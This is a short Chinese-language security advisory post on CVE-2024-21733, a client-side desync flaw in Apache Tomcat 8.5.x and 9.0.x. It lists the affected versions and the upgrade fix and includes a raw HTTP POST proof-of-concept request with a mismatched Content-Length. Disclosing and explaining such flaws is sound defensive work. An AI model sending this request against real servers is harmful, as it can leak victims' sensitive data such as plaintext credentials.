#  Apache Tomcat请求走私漏洞POC（CVE-2024-21733）   
cordium  幽荧安全   2024-08-13 19:40  
  
##   
  
**CVE-2024-21733漏洞描述**  
  
      从8.5.7到8.5.63，从9.0.0-M11到9.0.43的Apache Tomcat  
容易受到客户端不同步攻击。  
  
      当web服务器无法正确处理POST请求的Content-Length时，就会出现客户端不同步（CSD）漏洞。通过利用这种行为，攻击者可以迫使受害者的浏览器与网站的连接不同步，从而导致敏感数据从服务器和/或客户端连接中走私。  
  
      在某些情况下，这可能会泄露敏感数据，例如明文凭据。  
  
**漏洞POC**  
```
POST / HTTP/1.1
Host: hostname
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
Connection: keep-alive
Content-Length: 6
Content-Type: application/x-www-form-urlencoded

X
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/9mLqrfPo3BYwnXCvevDIabAqrWp6EljUlTXEKZa92qib28SLwMicTvTCGia0ASeYnSMjc7qWaYnOKxFPl7mShA5icg/640?wx_fmt=other&from=appmsg "")  
  
  
**受影响的版本**  
  
Apache Tomcat 9.0.0-M11 至 9.0.43  
  
Apache Tomcat 8.5.7 至 8.5.63  
  
**修复建议**  
  
      建议用户升级到8.5.64及以上版本或9.0.44及以上，其中包含此问题的修复程序。  
  
> **声明**  
  
  
  
切勿利用文章内容中的相关技术从事非法测试，所有测试需获得合法授权。非法利用此文所提供的信息而造成的任何直接或者间接损失的，其后果均由使用者本人负责，造成影响与作者以及幽荧安全无关。  
  
